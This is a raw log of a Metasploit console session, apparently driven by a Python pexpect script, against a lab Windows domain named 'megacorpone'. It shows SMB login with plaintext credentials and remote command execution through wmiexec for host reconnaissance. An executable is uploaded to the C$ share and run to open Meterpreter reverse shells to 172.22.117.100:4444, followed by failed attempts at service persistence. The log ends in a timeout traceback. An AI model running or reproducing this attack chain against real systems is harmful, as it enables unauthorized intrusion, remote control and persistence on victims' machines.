[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-                                                  [0m[36m[1m[37m         .                                         . .      [34mdBBBBBBb  dBBBP dBBBBBBP dBBBBBb  [37m.                       o     [34m  '   dB'                     BBP    dB'dB'dB' dBBP     dBP     dBP BB   dB'dB'dB' dBP      dBP     dBP  BB  dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                   [31mdBBBBBP  [34mdBBBBBb  dBP    dBBBBP dBP dBBBBBBP          [37m.                  [36m.                  [34mdB' dBP    dB'.BP                             [36m|       [31mdBP[34m    dBBBB' dBP    dB'.BP dBP    dBP                           [36m--o--    [31mdBP[34m    dBP    dBP    dB'.BP dBP    dBP                             [36m|     [31mdBBBBP[34m dBP    dBBBBP dBBBBP dBP    dBP[37m                                                                    .                .        o                  [32mTo boldly go where no                            shell has gone before[0m       =[ [33mmetasploit v6.1.22-dev[0m                          ]+ -- --=[ 2188 exploits - 1161 auxiliary - 400 post       ]+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]+ -- --=[ 9 evasion                                       ]Metasploit tip: Use the [32medit[0m command to open the currently active module in your editor[?1034h[4mmsf6[0m [0m> resource resource1.rcresource resource1.rc[0m[1m[34m[*][0m Processing /root/resource1.rc for ERB directives.resource (/root/resource1.rc)> use auxiliary/scanner/smb/smb_loginsmbclient //172.22.117.20/C$ -U megacorpone/tstark[0msmbclient //172.22.117.20/C$ -U megacorpone/tstarkresource (/root/resource1.rc)> set SMBUser tstark[0mSMBUser => tstarkresource (/root/resource1.rc)> set SMBPass Password![0mSMBPass => Password!resource (/root/resource1.rc)> set SMBDomain megacorpone[0mSMBDomain => megacorponeresource (/root/resource1.rc)> set RHOSTS 172.22.117.0/24[0mRHOSTS => 172.22.117.0/24resource (/root/resource1.rc)> use scanner/smb/impacket/wmiexec[0mresource (/root/resource1.rc)> set RHOSTS 172.22.117.20[0mRHOSTS => 172.22.117.20resource (/root/resource1.rc)> set SMBDomain megacorpone[0mSMBDomain => megacorponeresource (/root/resource1.rc)> set SMBPass Password![0mSMBPass => Password!resource (/root/resource1.rc)> set SMBUser tstark[0mSMBUser => tstarkresource (/root/resource1.rc)> set COMMAND whoami[0mCOMMAND => whoamiresource (/root/resource1.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m megacorpone\tstark[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource1.rc)> set COMMAND tasklist[0mCOMMAND => tasklistresource (/root/resource1.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Image Name                     PID Session Name        Session#    Mem Usage========================= ======== ================ =========== ============System Idle Process              0 Services                   0          8 KSystem                           4 Services                   0        140 KRegistry                        72 Services                   0      9,112 Ksmss.exe                       360 Services                   0        708 Kcsrss.exe                      464 Services                   0      4,504 Kwininit.exe                    532 Services                   0      5,624 Kcsrss.exe                      540 Console                    1      4,068 Kservices.exe                   616 Services                   0      7,056 Kwinlogon.exe                   624 Console                    1      7,312 Klsass.exe                      664 Services                   0     14,712 Kfontdrvhost.exe                736 Console                    1      2,400 Kfontdrvhost.exe                744 Services                   0      2,656 Ksvchost.exe                    804 Services                   0     15,776 Ksvchost.exe                    852 Services                   0      9,568 Kdwm.exe                        932 Console                    1     27,672 KLogonUI.exe                    940 Console                    1     36,220 Ksvchost.exe                    976 Services                   0     43,380 Ksvchost.exe                   1016 Services                   0      8,404 Ksvchost.exe                    412 Services                   0     15,460 Ksvchost.exe                    820 Services                   0     19,912 Ksvchost.exe                    844 Services                   0     26,216 Ksvchost.exe                    928 Services                   0      5,084 Ksvchost.exe                   1060 Services                   0     13,672 Ksvchost.exe                   1140 Services                   0     14,980 Ksvchost.exe                   1248 Services                   0      9,000 KVSSVC.exe                     1340 Services                   0      5,580 Ksvchost.exe                   1384 Services                   0      5,536 KMemory Compression            1572 Services                   0     49,464 Ksvchost.exe                   1644 Services                   0      5,632 Ksvchost.exe                   1708 Services                   0      5,180 Ksvchost.exe                   1716 Services                   0      7,324 Kspoolsv.exe                   1928 Services                   0     10,636 Ksvchost.exe                   1944 Services                   0     10,664 Ksvchost.exe                   1168 Services                   0     28,204 KMsMpEng.exe                   2056 Services                   0    114,636 KAbkXvwI.exe                   2108 Services                   0      2,620 KbuRFwvHw.exe                  2116 Services                   0      3,052 KIahjBpih.exe                  2124 Services                   0      2,796 KNdwb.exe                      2132 Services                   0      2,552 KnXITvMRO.exe                  2140 Services                   0      2,616 Ksvchost.exe                   2200 Services                   0     10,180 KAbkXvwI.exe                   2756 Services                   0      3,336 KnXITvMRO.exe                  2764 Services                   0      2,680 KNdwb.exe                      2780 Services                   0      2,748 KbuRFwvHw.exe                  2788 Services                   0      2,780 Ksvchost.exe                   1336 Services                   0      7,372 Ksvchost.exe                   1312 Services                   0     11,316 Kpowershell.exe                3300 Services                   0     24,988 Kconhost.exe                   3360 Services                   0      1,384 Ksvchost.exe                   3460 Services                   0      7,312 KWmiPrvSE.exe                  3720 Services                   0     10,916 KWmiPrvSE.exe                  3728 Services                   0      8,876 Ksvchost.exe                   2636 Services                   0     16,112 KNisSrv.exe                    3212 Services                   0     10,888 Ksvchost.exe                   2472 Services                   0     14,500 KMicrosoftEdgeUpdate.exe       2264 Services                   0      9,400 Ksvchost.exe                   3748 Services                   0      8,104 KIahjBpih.exe                  3112 Services                   0      3,940 KSgrmBroker.exe                3252 Services                   0      3,976 Kcmd.exe                       4024 Services                   0      3,796 Kconhost.exe                   3840 Services                   0     12,004 Ktasklist.exe                   564 Services                   0      8,640 K[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource1.rc)> set COMMAND systeminfo[0mCOMMAND => systeminforesource (/root/resource1.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Host Name:                 WINDOWS10OS Name:                   Microsoft Windows 10 Pro NOS Version:                10.0.19042 N/A Build 19042OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          sysadminRegistered Organization:   Product ID:                00331-60000-00000-AA609Original Install Date:     5/10/2021, 12:17:16 AMSystem Boot Time:          6/20/2023, 7:01:46 AMSystem Manufacturer:       Microsoft CorporationSystem Model:              Virtual MachineSystem Type:               x64-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: AMD64 Family 25 Model 33 Stepping 0 AuthenticAMD ~3700 MhzBIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.0, 11/1/2019Windows Directory:         C:\WindowsSystem Directory:          C:\Windows\system32Boot Device:               \Device\HarddiskVolume1System Locale:             en-us;English (United States)Input Locale:              en-us;English (United States)Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)Total Physical Memory:     865 MBAvailable Physical Memory: 178 MBVirtual Memory: Max Size:  2,593 MBVirtual Memory: Available: 1,850 MBVirtual Memory: In Use:    743 MBPage File Location(s):     C:\pagefile.sysDomain:                    megacorpone.localLogon Server:              N/AHotfix(s):                 7 Hotfix(s) Installed.                           [01]: KB5005539                           [02]: KB4562830                           [03]: KB4570334                           [04]: KB4580325                           [05]: KB4586864                           [06]: KB5006670                           [07]: KB5005699Network Card(s):           2 NIC(s) Installed.                           [01]: Microsoft Hyper-V Network Adapter                                 Connection Name: Ethernet                                 DHCP Enabled:    No                                 IP address(es)                                 [01]: 172.22.117.20                           [02]: Microsoft Hyper-V Network Adapter                                 Connection Name: Ethernet 2                                 Status:          Media disconnectedHyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource1.rc)> set COMMAND net session[0mCOMMAND => net sessionresource (/root/resource1.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Computer               User name            Client Type       Opens Idle time-------------------------------------------------------------------------------\\127.0.0.1            WINDOWS10$                                 0 00:00:11    \\127.0.0.1            tstark                                     0 00:00:02    \\127.0.0.1            tstark                                     1 00:00:01    \\127.0.0.1            tstark                                     0 00:00:17    \\172.22.117.100       tstark                                     0 00:00:01    The command completed successfully.[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource1.rc)> set COMMAND net share[0mCOMMAND => net shareresource (/root/resource1.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Share name   Resource                        Remark-------------------------------------------------------------------------------C$           C:\                             Default share                     IPC$                                         Remote IPC                        ADMIN$       C:\Windows                      Remote Admin                      The command completed successfully.[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completed[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> smbclient //172.22.117.20/C$ -U m egacorpone/tstark[0m[1m[34m[*][0m exec: smbclient //172.22.117.20/C$ -U megacorpone/tstarkEnter MEGACORPONE\tstark's password: Password!Try "help" to get a list of possible commands.[?2004hsmb: \> put 01.exeput 01.exe[?2004lputting file 01.exe as \01.exe (304.3 kb/s) (average 304.3 kb/s)[?2004hsmb: \> exitexit[?2004l[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rcresource resource2.rc[0m[1m[34m[*][0m Processing /root/resource2.rc for ERB directives.resource (/root/resource2.rc)> use exploit/multi/handler[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcpresource (/root/resource2.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp[0mPAYLOAD => windows/x64/meterpreter/reverse_tcpresource (/root/resource2.rc)> set LHOST 172.22.117.100[0mLHOST => 172.22.117.100resource (/root/resource2.rc)> set LPORT 4444[0mLPORT => 4444resource (/root/resource2.rc)> run -j[0m[1m[34m[*][0m Exploit running as background job 0.[1m[34m[*][0m Exploit completed, but no session was created.resource (/root/resource2.rc)> use scanner/smb/impacket/wmiexec[0m[1m[34m[*][0m Started reverse TCP handler on 172.22.117.100:4444 resource (/root/resource2.rc)> set RHOSTS 172.22.117.20[0mRHOSTS => 172.22.117.20resource (/root/resource2.rc)> set SMBDomain megacorpone[0mSMBDomain => megacorponeresource (/root/resource2.rc)> set SMBPass Password![0mSMBPass => Password!resource (/root/resource2.rc)> set SMBUser tstark[0mSMBUser => tstarkresource (/root/resource2.rc)> set COMMAND C:\\01.exe[0mCOMMAND => C:\01.exeresource (/root/resource2.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m Sending stage (200262 bytes) to 172.22.117.20[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Sending stage (200262 bytes) to 172.22.117.20[0m[0m[1m[34m[*][0m Meterpreter session 2 opened (172.22.117.100:4444 -> 172.22.117.20:61711 ) at 2023-06-20 07:06:59 -0400[1m[34m[*][0m  - Meterpreter session 1 closed.  Reason: Died[1m[31m[-][0m Meterpreter session 1 is not valid and will be closedresource resource2.rcresource resource2.rc[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource2.rc)> sessions -i 1[0m[1m[31m[-][0m Invalid session identifier: 1[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rc[0m[1m[34m[*][0m Processing /root/resource2.rc for ERB directives.resource (/root/resource2.rc)> use exploit/multi/handler[0m[1m[34m[*][0m Using configured payload windows/x64/meterpreter/reverse_tcpresource (/root/resource2.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp[0mPAYLOAD => windows/x64/meterpreter/reverse_tcpresource (/root/resource2.rc)> set LHOST 172.22.117.100[0mLHOST => 172.22.117.100resource (/root/resource2.rc)> set LPORT 4444[0mLPORT => 4444resource (/root/resource2.rc)> run -j[0m[1m[34m[*][0m Exploit running as background job 1.[1m[34m[*][0m Exploit completed, but no session was created.resource (/root/resource2.rc)> use scanner/smb/impacket/wmiexec[0m[1m[34m[*][0m Started reverse TCP handler on 172.22.117.100:4444 resource (/root/resource2.rc)> set RHOSTS 172.22.117.20[0mRHOSTS => 172.22.117.20resource (/root/resource2.rc)> set SMBDomain megacorpone[0mSMBDomain => megacorponeresource (/root/resource2.rc)> set SMBPass Password![0mSMBPass => Password!resource (/root/resource2.rc)> set SMBUser tstark[0mSMBUser => tstarkresource (/root/resource2.rc)> set COMMAND C:\\01.exe[0mCOMMAND => C:\01.exeresource (/root/resource2.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Sending stage (200262 bytes) to 172.22.117.20[1m[34m[*][0m Sending stage (200262 bytes) to 172.22.117.20[0m[0m[1m[34m[*][0m Meterpreter session 4 opened (172.22.117.100:4444 -> 172.22.117.20:62331 ) at 2023-06-20 07:17:10 -0400[1m[34m[*][0m  - Meterpreter session 3 closed.  Reason: Died[1m[31m[-][0m Meterpreter session 3 is not valid and will be closedresource resource2.rcresource resource2.rcbackgroundresource resource3.rcbackgroundresource resource3.rc[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource2.rc)> sessions -i 1[0m[1m[31m[-][0m Invalid session identifier: 1[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource2.rc[0m[1m[34m[*][0m Processing /root/resource2.rc for ERB directives.resource (/root/resource2.rc)> use exploit/multi/handler[0m[1m[34m[*][0m Using configured payload windows/x64/meterpreter/reverse_tcpresource (/root/resource2.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp[0mPAYLOAD => windows/x64/meterpreter/reverse_tcpresource (/root/resource2.rc)> set LHOST 172.22.117.100[0mLHOST => 172.22.117.100resource (/root/resource2.rc)> set LPORT 4444[0mLPORT => 4444resource (/root/resource2.rc)> run -j[0m[1m[34m[*][0m Exploit running as background job 2.[1m[34m[*][0m Exploit completed, but no session was created.resource (/root/resource2.rc)> use scanner/smb/impacket/wmiexec[0m[1m[34m[*][0m Started reverse TCP handler on 172.22.117.100:4444 resource (/root/resource2.rc)> set RHOSTS 172.22.117.20[0mRHOSTS => 172.22.117.20resource (/root/resource2.rc)> set SMBDomain megacorpone[0mSMBDomain => megacorponeresource (/root/resource2.rc)> set SMBPass Password![0mSMBPass => Password!resource (/root/resource2.rc)> set SMBUser tstark[0mSMBUser => tstarkresource (/root/resource2.rc)> set COMMAND C:\\01.exe[0mCOMMAND => C:\01.exeresource (/root/resource2.rc)> run[0m[1m[34m[*][0m Running for 172.22.117.20...[1m[34m[*][0m 172.22.117.20 - SMBv3.0 dialect used[1m[34m[*][0m Sending stage (200262 bytes) to 172.22.117.20[1m[34m[*][0m Sending stage (200262 bytes) to 172.22.117.20[0m[0m[1m[34m[*][0m Meterpreter session 6 opened (172.22.117.100:4444 -> 172.22.117.20:62889 ) at 2023-06-20 07:27:21 -0400[1m[34m[*][0m  - Meterpreter session 5 closed.  Reason: Died[1m[31m[-][0m Meterpreter session 5 is not valid and will be closedresource resource3.rcresource resource3.rc[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)[1m[34m[*][0m Auxiliary module execution completedresource (/root/resource2.rc)> sessions -i 1[0m[1m[31m[-][0m Invalid session identifier: 1[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> background[0m[1m[31m[-][0m Unknown command: background[4mmsf6[0m auxiliary([1m[31mscanner/smb/impacket/wmiexec[0m) [0m> resource resource3.rc[0m[1m[34m[*][0m Processing /root/resource3.rc for ERB directives.resource (/root/resource3.rc)> use windows/local/persistence_service[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcpresource (/root/resource3.rc)> set LHOST 172.22.117.100[0mLHOST => 172.22.117.100resource (/root/resource3.rc)> set SESSION 1[0mSESSION => 1resource (/root/resource3.rc)> run[0m[1m[31m[-][0m Msf::OptionValidateError The following options failed to validate: SESSION[1m[34m[*][0m Exploit completed, but no session was created.[4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> resource resource3.rc[0m[1m[34m[*][0m Processing /root/resource3.rc for ERB directives.resource (/root/resource3.rc)> use windows/local/persistence_service[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcpresource (/root/resource3.rc)> set LHOST 172.22.117.100[0mLHOST => 172.22.117.100resource (/root/resource3.rc)> set SESSION 1[0mSESSION => 1resource (/root/resource3.rc)> run[0m[1m[31m[-][0m Msf::OptionValidateError The following options failed to validate: SESSION[1m[34m[*][0m Exploit completed, but no session was created.[4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> resource resource3.rcresource resource3.rc[0m[1m[34m[*][0m Processing /root/resource3.rc for ERB directives.resource (/root/resource3.rc)> use windows/local/persistence_service[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcpresource (/root/resource3.rc)> set LHOST 172.22.117.100[0mLHOST => 172.22.117.100resource (/root/resource3.rc)> set SESSION 1[0mSESSION => 1resource (/root/resource3.rc)> run[0m[1m[31m[-][0m Msf::OptionValidateError The following options failed to validate: SESSION[1m[34m[*][0m Exploit completed, but no session was created.[4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> shellshell[0m[1m[31m[-][0m Unknown command: shell[4mmsf6[0m exploit([1m[31mwindows/local/persistence_service[0m) [0m> RESOURCE3 RESTARTING - RETRYING 3/3SUCCESS - REQUESTING SHELL<class 'pexpect.exceptions.TIMEOUT'>Traceback (most recent call last):  File "/root/metascriptv04.py", line 111, in <module>    msf_script.expect('C:\\ ', timeout=120)  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 343, in expect    return self.expect_list(compiled_pattern_list,  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 372, in expect_list    return exp.expect_loop(timeout)  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 181, in expect_loop    return self.timeout(e)  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 144, in timeout    raise excpexpect.exceptions.TIMEOUT: Timeout exceeded.<pexpect.pty_spawn.spawn object at 0x7f6dd6b3b4f0>command: /usr/bin/msfconsoleargs: [b'/usr/bin/msfconsole']buffer (last 100 chars): ' Unknown command: shell\r\n\x1b[4mmsf6\x1b[0m exploit(\x1b[1m\x1b[31mwindows/local/persistence_service\x1b[0m) \x1b[0m> 'before (last 100 chars): ' Unknown command: shell\r\n\x1b[4mmsf6\x1b[0m exploit(\x1b[1m\x1b[31mwindows/local/persistence_service\x1b[0m) \x1b[0m> 'after: <class 'pexpect.exceptions.TIMEOUT'>match: Nonematch_index: Noneexitstatus: Noneflag_eof: Falsepid: 18269child_fd: 5closed: Falsetimeout: 30delimiter: <class 'pexpect.exceptions.EOF'>logfile: <_io.TextIOWrapper name='Metascript_logs.txt' mode='w' encoding='utf-8'>logfile_read: Nonelogfile_send: Nonemaxread: 2000ignorecase: Falsesearchwindowsize: Nonedelaybeforesend: 0.05delayafterclose: 0.1delayafterterminate: 0.1searcher: searcher_re:    0: re.compile('C:\\ ')